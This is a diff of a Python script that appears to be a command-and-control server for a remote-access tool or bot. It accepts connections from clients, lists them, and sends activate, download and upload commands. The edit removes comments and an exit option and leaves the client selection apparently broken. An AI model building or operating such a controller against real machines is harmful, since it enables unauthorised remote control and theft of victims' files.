@@ -18,7 +18,6 @@ socks = []
 clients = []
 active = False
 
-# server requires bot to send file
 def download(sock, file):
   Send(sock, 'download ' + file)
   pr('Downloading ' + file)
@@ -28,7 +27,6 @@ def download(sock, file):
   f.write(d)
   f.close()
 
-# server requires bot to receive file
 def upload(sock, file):
   Send(sock, 'upload ' + file)
   pr('Uploading ' + file)
@@ -55,16 +53,14 @@ def refresh():
     return
 
   for i in range(0, l):
-    j = i + 1
-    pr('Client %d: %s' % (j, clients[i]))
+    pr('Client %d: %s' % (i, clients[i]))
 
   pr('Press Ctrl+C to interact with client.')
 
 while True:
   refresh()
+  server.settimeout(10)
   try:
-    server.settimeout(10)
-
     try:
       s, a = server.accept()
     except socket.timeout:
@@ -73,24 +69,13 @@ while True:
     s.settimeout(None)
     socks.append(s)
     clients.append(str(a))
-
     refresh()
   except KeyboardInterrupt:
     activate = input('Enter option: ')
-
-    if activate == 0:
-      pr('Exiting...')
-
-      for i in range(0, len(socks)):
-        socks[i].close()
-
-      sys.exit()
-
+    
     Send(socks[activate], 'activate')
-
     pr('Activating client %d: %s' % (activate, clients[activate]))
 
-    activate -= 1
     cipher = get_cipher()
     active = True
 
